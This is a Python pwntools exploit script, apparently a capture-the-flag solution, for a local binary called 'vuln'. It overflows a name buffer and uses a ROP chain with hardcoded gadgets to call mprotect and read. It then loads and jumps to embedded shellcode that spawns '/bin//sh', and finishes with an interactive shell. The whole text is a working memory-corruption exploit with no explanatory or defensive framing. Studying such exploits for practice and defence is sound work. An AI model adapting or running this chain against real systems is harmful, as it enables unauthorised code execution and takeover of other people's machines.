#!/usr/bin/env python3

from pwn import *

GADGETS = {
    "pop rdi; ret" : p64(0x0000000000400696),
    "pop rdx; pop rsi; ret" : p64(0x000000000044cc49)
}
shellcode_addr = 0x0000000000400000
vuln = ELF("./vuln", checksec=False)
shellcode = b"\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05"

with process("./vuln") as conn:
    conn.sendlineafter("?\n", "84")
    
    conn.sendlineafter("Name? ", flat([
        b"A" * 120,
        
        # mprotect(0x0000000000400000, 0xb7000, 7)
        GADGETS["pop rdi; ret"],
        p64(shellcode_addr),
        GADGETS["pop rdx; pop rsi; ret"],
        p64(7),
        p64(0xb7000),
        p64(vuln.symbols["mprotect"]),
        
        # read(0, 0x0000000000400000, 4096)
        GADGETS["pop rdi; ret"],
        p64(0),
        GADGETS["pop rdx; pop rsi; ret"],
        p64(4096),
        p64(shellcode_addr),
        p64(vuln.symbols["read"]),
        
        # execute shellcode
        p64(shellcode_addr)
    ]))
    
    conn.sendline(shellcode)
    
    conn.interactive()
